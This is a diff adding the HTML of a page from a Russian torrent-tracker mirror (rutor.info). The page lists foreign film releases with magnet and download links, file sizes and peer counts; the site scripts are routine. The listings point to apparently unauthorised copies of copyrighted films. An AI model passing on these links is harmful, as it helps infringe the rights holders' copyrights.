@@ -1,0 +1,496 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="/s/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="/s/favicon.ico" />
+	<title>зеркало rutor.info :: Зарубежные фильмы</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/s/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="/s/t/functions.js"></script>
+	<script type="text/javascript" src="/s/ui/ui.core.js"></script>
+		<script type="text/javascript" src="/s/ui/ui.datepicker.js"></script>
+		<script type="text/javascript" src="/s/ui/i18n/ui.datepicker-ru.js"></script>
+		<link href="/s/ui/themes/ui-lightness/ui.css" rel="stylesheet" type="text/css" media="screen" />
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="/s/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="/s/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="/s/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="/s/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Зарубежные фильмы</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+<center><h1><span id="browser_msg"></span><a href="/torrent/178905" target="_blank"><span style="color:red;">RUTOR.ORG скоро будет заблокирован  в России</span>, читайте информация по блокировкам</a></h1></center><script type="text/javascript">if (navigator.userAgent.match(/Firefox/)) { document.getElementById("browser_msg").innerHTML="<a href=\"https://addons.mozilla.org/ru/firefox/addon/anticenz/\" target=\"_blank\">Восстановить доступ к оригинальному rutor.org и другим заблокированным сайтам!</a> "; } else { document.getElementById("browser_msg").innerHTML="<a href=\"https://anticenz.org/\" target=\"_blank\">Нажмите здесь для восстановления доступа к оригинальному rutor.org и другим заблокированным сайтам!</a> "; } $(document).ready(function(){$.ajax({url:"http://rutor.lib/ping.php?proto=lib&"+Math.random()+"="+Math.random(),dataType:"jsonp",jsonpCallback:"redir_lib",success:function(data){if(data.status=="ok"){location.href=location.href.replace(/http:\/\/([^\/]+)/,"http://rutor.lib");}}});});</script>
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script>
+	<!--<script type="text/javascript" src="/c/tags.js"></script>-->
+	<script type="text/javascript">
+	var search_page = 1;
+	var search_category = 1;
+	var search_sort = 0;
+	var user = 0;
+	var sort_ascdesc = 0;
+
+	if (search_sort % 2 != 0)
+	{
+		search_sort -= 1;
+		sort_ascdesc = 1;
+	}
+		$(document).ready(function()
+	{
+		$('#category_id').attr("value", search_category);
+		$('#sort_id').attr("value", search_sort);
+		if (sort_ascdesc == 0)
+			$('input[name=s_ad]')[1].checked = true;
+		else
+			$('input[name=s_ad]')[0].checked = true;
+	});
+
+	function search_submit()
+	{
+		var sort_id = $('#sort_id').val();
+		sort_id = parseInt(sort_id)+parseInt($('input[name=s_ad]:checked').val());
+		if ($('#datepicker1').val() != "" || $('#datepicker2').val() != "")
+		{
+			sort_id = sort_id + ';' + $('#datepicker1').val() + ';' + $('#datepicker2').val();
+		}
+		document.location.href = '/browse/' + search_page + '/' + $('#category_id').val() + '/' + user + '/' + sort_id;
+	}
+	</script><fieldset><legend>Просмотр раздач</legend>
+	<form onsubmit="search_submit(); return false;">
+	<table>
+	<tr>
+	<td>Категория</td>
+	<td>
+	<!--<select name="category" id="category_id" onchange="change_tags(0);">-->
+	<select name="category" id="category_id">
+		<option value="0">Любая категория</option><option value="1">Зарубежные фильмы</option><option value="5">Наши фильмы</option><option value="12">Научно-популярные фильмы</option><option value="4">Сериалы </option><option value="6">Телевизор</option><option value="7">Мультипликация </option><option value="10">Аниме </option><option value="2">Музыка</option><option value="8">Игры </option><option value="9">Софт </option><option value="13">Спорт и Здоровье</option><option value="15">Юмор</option><option value="14">Хозяйство и Быт</option><option value="11">Книги </option><option value="3">Другое</option></select>
+	</td>
+	</tr>
+	<tr>
+	<td>Упорядочить по</td>
+	<td>
+	<select id="sort_id">
+		<option value="0">дате добавления</option>
+		<option value="2">раздающим</option>
+		<option value="4">качающим</option>
+		<option value="6">названию</option>
+		<option value="8">размеру</option>
+	</select>
+	по
+	<label><input type="radio" name="s_ad" value="1"  />возрастанию</label>
+	<label><input type="radio" name="s_ad" value="0"  checked="checked"  />убыванию</label>
+	</td>
+	</tr>
+
+	<tr>
+		<td>Отобрать по дате</td>
+		<td>с <input type="text" id="datepicker1" value=""> до <input type="text" id="datepicker2" value=""></td>
+	</tr>
+	<script type="text/javascript">
+	$(function() {
+		$("#datepicker1").datepicker({
+			changeMonth: true,
+			changeYear: true
+		});
+	});
+	$(function() {
+		$("#datepicker2").datepicker({
+			changeMonth: true,
+			changeYear: true
+		});
+	});
+	</script>
+
+	<tr>
+	<td>
+	<input type="submit" value="Поехали" onclick="search_submit(); return false;" />
+	</td>
+	</tr>
+
+	</table>
+	</form>
+	</fieldset><p align="center"><a href="/browse/0/1/0/0"><b>&lt;&lt;&nbsp;Предв.</b></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="/browse/2/1/0/0"><b>След.&nbsp;&gt;&gt;</b></a><br /><a href="/browse/0/1/0/0"><b>1&nbsp;-&nbsp;100</b></a> | <b>101&nbsp;-&nbsp;200</b> | <a href="/browse/2/1/0/0"><b>201&nbsp;-&nbsp;300</b></a> | <a href="/browse/3/1/0/0"><b>301&nbsp;-&nbsp;400</b></a> | ... | <a href="/browse/1175/1/0/0"><b>117501&nbsp;-&nbsp;117600</b></a> | <a href="/browse/1176/1/0/0"><b>117601&nbsp;-&nbsp;117700</b></a> | <a href="/browse/1177/1/0/0"><b>117701&nbsp;-&nbsp;117742</b></a></p>
+<div id="index"><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr>
+
+	<tr class="gai">
+		<td>12&nbsp;Янв&nbsp;18</td>
+		<td colspan = "2">
+			<a class="downgif" href="/download/607050">
+				<img src="/s/i/d.gif" alt="D" />
+			</a>
+			<a href="magnet:?xt=urn:btih:6d6d9b4428cfa4137c3d3217a8bc93a7524cbf2c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce">
+				<img src="/s/i/m.png" alt="M" />
+			</a>
+			<a href="/torrent/607050/drevesnyj-demon_arbor-demon_enclosure-2016-web-dlrip-l">
+				Древесный демон / Arbor Demon / Enclosure (2016) WEB-DLRip | L
+			</a>
+		</td>
+		<td align="right">
+			1.37&nbsp;GB
+		</td>
+		<td align="center">
+			<span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;
+			<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span>
+		</td>
+	</tr>
+
+	<tr class="tum">
+		<td>12&nbsp;Янв&nbsp;18</td>
+		<td >
+			<a class="downgif" href="/download/607048"><img src="/s/i/d.gif" alt="D" /></a>
+			<a href="magnet:?xt=urn:btih:ca2e07fe88dc8410e784e3fb23d01b923d90b34e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607048/specialist_gli-specialisti-1969-dvdrip-p">Специалист / Gli specialisti (1969) DVDRip | P </a></td>
+		<td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+		<td align="right">1.46&nbsp;GB</td>
+		<td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;19</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr>
+
+	<tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/514574"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:19f43521c964a0597b723a0a47bb3da8b597740a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/514574/fakultet_the-faculty-1998-bdrip-720p-p-p2-a">Факультет / The Faculty (1998) BDRip 720p | P, P2, A </a></td> <td align="right">7<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.96&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;15</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/607019"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6686e6fddc2fb8131bdbd1cbe303a010c65dcb1d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607019/pogonja-v-manhjettene_manhattan-chase-2000-dvd5-custom-l1">Погоня в Манхэттене / Manhattan Chase (2000) DVD5 | Custom | L1 </a></td> 
+<td align="right">4.14&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606970"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7d879357fa11a88e56df3a85a7ab280d78714aef&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606970/chelovek-pauk-trilogija_spider-man-trilogy-2002-2007-4hdvd5-d">Человек-Паук: Трилогия / Spider-Man: Trilogy (2002-2007) 4хDVD5 | D </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">17.47&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/607034"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5cb7e22c1c4240db9dff54182398ab3e2ac899d4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607034/farforovaja-luna_china-moon-1991-bdrip-ot-koenig-p2">Фарфоровая луна / China Moon (1991) BDRip от Koenig | P2 </a></td> 
+<td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;9</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/607028"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:52590d6cc5f58d62344bf85bc0ac4c14ef57c954&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607028/dzhoj_joy-2015-dvd9-licenzija">Джой / Joy (2015) DVD9 | Лицензия </a></td> 
+<td align="right">7.24&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607027"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:dbb44d15388b79075d66ebdf7f16f0c92dbc9e50&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607027/beguwij-po-lezviju-2049_blade-runner-2049-2017-bdremux-1080p-us-transfer-d-a-licenzija">Бегущий по лезвию 2049 / Blade Runner 2049 (2017) BDRemux 1080p | US Transfer | D, A | Лицензия </a></td> <td align="right">7<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">32.79&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;75</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;25</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607023"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cf1ea7b2d8aae2ecfc5528da6c75848ee530c15f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607023/obratnyj-otschjot-perezapusk_reset_zhi-ming-dao-shu-2017-webrip-avc-ot-k.e.n-l-l1">Обратный отсчёт: Перезапуск / Reset / Zhi ming dao shu (2017) WEBRip-AVC от k.e.n | L, L1 </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;116</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;9</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607017"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ade4b3248d405fef551b4e2a60e5c0d18f123611&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607017/osnovanie-armii_the-founding-of-an-army_jian-jun-da-ye-2017-webrip-720p-l">Основание армии / The Founding of an Army / Jian jun da ye (2017) WEBRip 720p | L </a></td> <td align="right">10<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">5.04&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;135</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607015"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6b84d86320939893f007c5d00a6bc65d69e6cd81&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607015/kozyrnye-tuzy_smokin-aces-2006-web-dlrip-d-open-matte">Козырные тузы / Smokin&#039; Aces (2006) WEB-DLRip | D | Open Matte </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;37</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607004"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f8f6cbf253c1d636841aecd34f461aaf716ce1e3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607004/chikago_chicago-2002-bdremux-1080p-d-r">Чикаго / Chicago (2002) BDRemux 1080p | D, Р </a></td> <td align="right">12<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">24.70&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606729"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f14646b446295d91d2ee1cf831f72e483511a801&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606729/van-gog-s-ljubovju-vinsent_loving-vincent-2017-bdrip-ot-megapeer-itunes">Ван Гог. С любовью, Винсент / Loving Vincent (2017) BDRip от MegaPeer | iTunes </a></td> <td align="right">10<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.42&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;211</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607005"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c23e6f55481f062b13501c779c919b2a092b882b&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607005/angely-i-demony_angels-demons-2009-web-dlrip-avc-ot-kaztorrents-d-open-matte">Ангелы и Демоны / Angels &amp; Demons (2009) WEB-DLRip-AVC от Kaztorrents | D | Open Matte </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.16&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/535678"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bf5d42aaf30e3c557757fba73be2f400c0b42bc7&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/535678/moj-ljubimyj-marsianin_my-favorite-martian-1999-web-dl-1080p-d-p-a">Мой любимый марсианин / My Favorite Martian (1999) WEB-DL 1080p | D, P, A </a></td> <td align="right">4<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">9.78&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606988"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1bc320af1077462a4b2646e35ec6f0087e288242&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606988/gran-buduwego_edge-of-tomorrow-2014-bdrip-hevc-720p-ot-r.g-hd-films-60-fps">Грань будущего / Edge of Tomorrow (2014) BDRip-HEVC 720p от R.G. HD-Films | 60 fps </a></td> <td align="right">20<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">4.29&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;87</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/607000"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:302ed59f3cc485b6c61e33699f2934fea5e8f3bb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/607000/nikto-ne-sovershenen_nessuno-è-perfetto-1981-dvdrip-avc-ot-exkinoray-a">Никто не совершенен / Nessuno è perfetto (1981) DVDRip-AVC от ExKinoRay | A </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.58&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;33</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606987"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:66edd9fdb104481b1a4c49227e466456ef534268&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606987/nell_nell-1994-web-dlrip-720p-ot-korsar-p2-a">Нелл / Nell (1994) WEB-DLRip 720p от KORSAR | P2, A </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">7.03&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606996"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:00386b40b0e34516defb0f1dbfada469eefb9622&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606996/den-materi_mothers-day-2010-hdrip-avc-ot-exkinoray-p">День матери / Mother&#039;s Day (2010) HDRip-AVC от ExKinoRay | P </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">744.14&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;13</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606992"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c30f8c1558e9e840cdacc6ac7d53ac102a671f80&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606992/kozyrnye-tuzy_smokin-aces-2006-web-dlrip-avc-d-open-matte">Козырные тузы / Smokin&#039; Aces (2006) WEB-DLRip-AVC | D | Open Matte </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.33&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;40</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/605789"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:838f31732dce83e8c4e04f4fdbbae3badea7a850&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/605789/prowaj-kristofer-robin_goodbye-christopher-robin-2017-hdrip-ot-megapeer-itunes">Прощай, Кристофер Робин / Goodbye Christopher Robin (2017) HDRip от MegaPeer | iTunes </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">746.91&nbsp;MB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;36</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606977"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2f9f31f579f62b2c79b7de07091cecba6eec6589&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606977/ono_it-2017-bdrip-avc-ot-drvampir-d-l-licenzija">Оно / It (2017) BDRip-AVC от DrVampir | D, L | Лицензия </a></td> 
+<td align="right">2.17&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;52</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="/download/606976"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:eeb97cd9f161846d38027f224e80fdf8a385355a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606976/djedpul_deadpool-2016-uhd-bdremux-2160p-4k-hdr-d-p-a-licenzija">Дэдпул / Deadpool (2016) UHD BDRemux 2160p | 4K | HDR | D, P, A | Лицензия </a></td> 
+<td align="right">60.07&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;9</span></td></tr><tr class="tum"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606972"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0ce4295800dc3ea127ddc1cb15c3ed59a7872625&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606972/prowaj-kristofer-robin_goodbye-christopher-robin-2017-bdrip-1080p-itunes">Прощай, Кристофер Робин / Goodbye Christopher Robin (2017) BDRip 1080p | iTunes </a></td> <td align="right">1<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">10.03&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;100</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;16</span></td></tr><tr class="gai"><td>12&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606951"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8254a8ecd97a0dd7694bcd6904b4b3598a57e12d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606951/forma-vody_the-shape-of-water-2017-dvdscr-sub">Форма воды / The Shape of Water (2017) DVDScr | Sub </a></td> <td align="right">37<img src="/s/i/com.gif" alt="C" /></td>
